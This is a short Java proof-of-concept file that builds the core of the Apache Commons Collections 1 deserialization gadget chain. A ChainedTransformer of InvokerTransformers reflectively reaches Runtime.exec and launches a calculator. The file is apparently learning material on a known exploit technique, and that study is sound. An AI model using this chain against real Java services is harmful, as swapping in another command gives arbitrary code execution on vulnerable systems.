package CC1LazyMap;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Method;

public class InvokeTransformer1 {
    public static void main(String[] args) throws Exception {
        /*
        input = Runtime
        iMethodName = exec
        iParamTypes = String.class
        iArgs = "/usr/bin/gnome-calculator"
         */
        String cmd = "/usr/bin/gnome-calculator";

        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer(
                        "getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
    }
}
